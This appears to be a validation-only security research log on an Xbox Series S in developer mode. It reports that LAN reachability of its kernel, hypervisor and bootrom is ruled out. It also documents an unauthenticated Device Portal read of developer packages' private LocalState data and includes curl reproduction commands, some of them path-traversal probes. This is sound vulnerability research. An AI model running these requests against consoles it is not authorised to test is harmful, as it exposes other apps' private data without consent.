# Research Session 6 — kernel / hypervisor / bootrom reachability + cross-package dev data read

_2026-11-25 · target `10.0.0.23` · Xbox Series S · SystemOS `26100.9662.amd64fre.xb_flt_2610ge.261104-2200`_
_scope: declared estate only · validation-only · NO-GAIN · no persistence installed · no credential guessing_

Session question: **can the console's hypervisor, kernel, bootrom, or an unsigned persistent execution path be reached from the LAN?**

## Verdict table

| lane | verdict | evidence |
|---|---|---|
| Bootrom | **not reachable** | Only public compromise (Bliss / Gaasedelen, RE//verse 2026) is North Bridge **voltage glitching** — physical. No network interface. |
| Hypervisor | **not reachable** | No exported listener. Top-300 + curated 1-1024 + debug ranges (730, 731, 4118, 27000-27005, 29800-29810, 50000) → only 22/445/2869/9127/11443 open; all debug/KD ports **filtered**. |
| Kernel LPE | **patched** | Build 26100.9662 is past Artifice (fixed 10.0.26100.1968) and past Collateral Damage / CVE-2024-30088 (25398.4478–4909 only). |
| Unauthenticated RCE | **none** | No SMBv1/MS17-010; WDP writes 403; SSH requires `DevToolsUser` pairing; UPnP is query-only SOAP. |
| Unsigned exec | **authenticated only** | WDP app-deploy and file upload reject anonymous POSTs; dashboard upload→launch runs inside its own AppContainer. |
| Persistence | **primitive exists, auth-gated, not installed** | `unattendedsetup-apply` boot script returns 403 anonymously; no anonymous SMB write. |

## New confirmed findings

### SPY-027 (headline) — unauthenticated cross-package read of developer-package private state

WDP validates the package: system packages are refused with `File access is only allowed for developer packages`. Developer packages are not, and no authentication is required.

```
GET /api/filesystem/apps/files?knownfolderid=LocalAppData&packagefullname=<dev-pfn>&path=\LocalState
→ 200, lists tiramisu.log (4124B), drive_c

GET /api/filesystem/apps/file?knownfolderid=LocalAppData&packagefullname=<dev-pfn>&path=\LocalState&filename=tiramisu.log
→ 200, returns log contents (install path under S:\Program Files\WindowsApps, state root under Q:\Users\...)
```

Control (same call, system package `WebAuthBridgeInternet`): `File access is only allowed for developer packages`.
Traversal control (`path=..\..\..`, `..\..\..\..\..\Windows`): **HTTP 400** at every depth — no out-of-root read.

Why it matters: a package's `LocalState`/`LocalAppData` is private per-AppContainer state (logs, saves, config, sometimes tokens). Any page or host on the LAN can enumerate and read it for **any installed developer package** without credentials. Combined with SPY-002 (unauthenticated dashboard control PIN → Bearer pair), the dev-mode LAN surface allows read + control, though still *inside* the dev packages' containers — not the SystemOS kernel.

### SPY-022 — unauthenticated WDP **file content** read, not just listing

`GET /api/filesystem/apps/file?knownfolderid=Documents&filename=desktop.ini` returned the 190-byte body. SPY-018 previously covered names only. `DevelopmentFiles` (`D:\DevelopmentFiles\`) is also listable unauthenticated; `SystemRoot`, `Windows`, `InstalledGames`, `Public`, `Temp` → 403 unsupported.

### SPY-023 — every WDP mutation endpoint rejects anonymous writes

Anonymous `POST {}` to `/api/app/packagemanager/package`, `/api/filesystem/apps/file`, `/api/os/restart`, `/api/os/shutdown`, `/api/controls/reboot`, `/api/devmode/unattendedsetup-apply` → **403**, zero-byte body, no side effects. The unsigned-deploy and persistence primitives are auth-gated.

### SPY-024 — SMB2 signing enabled but not required

`Message signing enabled but not required` → NTLM relay lane technically open (T1557). Null session authenticates anonymously but every share tree returns `ACCESS_DENIED` / `BAD_NETWORK_NAME`; `smbclient -N //10.0.0.23/IPC$ ls` → `ACCESS_DENIED`; `rpcclient -N` SAMR → `ACCESS_DENIED`. No anonymous write, no anonymous account enumeration.

### SPY-025 / SPY-026 — cleared kernel and boot-surface lanes

Registered with the live build string and the filtered port map as evidence (see table above).

## Source cross-check

`tiramisu/src/host/webxfer.cpp:sanitize_rel_path()` rejects `..`, `:` and control characters and caps at 512 bytes, so the dashboard's upload path is not traversable; the 9127 upload→launch primitive is real but confined to the app container.

## Honest ceiling

No unsigned, persistent, kernel-level path exists from the LAN on this build. Remaining routes are (1) operator credentials — WDP password or SSH pairing PIN, a dev-mode feature; (2) physical access — bootrom glitching; (3) a new Windows 26100 AppContainer→SYSTEM LPE, which is research rather than recon.

## Reproduction (sanitized, read-only)

```bash
B=https://10.0.0.23:11443
curl -sk "$B/api/os/info"
curl -sk "$B/api/filesystem/apps/files?knownfolderid=Documents"
curl -sk "$B/api/filesystem/apps/file?knownfolderid=Documents&filename=desktop.ini"
# developer package state (replace <dev-pfn> with a PackageFullName from /api/app/packagemanager/packages)
curl -sk --get --data-urlencode knownfolderid=LocalAppData \
     --data-urlencode packagefullname=<dev-pfn> \
     --data-urlencode 'path=\LocalState' "$B/api/filesystem/apps/files"
# negative controls
curl -sk -o /dev/null -w '%{http_code}\n' -X POST -H 'Content-Type: application/json' -d '{}' "$B/api/app/packagemanager/package"   # 403
curl -sk --get --data-urlencode knownfolderid=LocalAppData --data-urlencode packagefullname=<dev-pfn> \
     --data-urlencode 'path=..\..\..' "$B/api/filesystem/apps/files"                                                                # 400
```

No writes were issued to any device. Nothing was retained from the console beyond the size/parameter evidence quoted above.
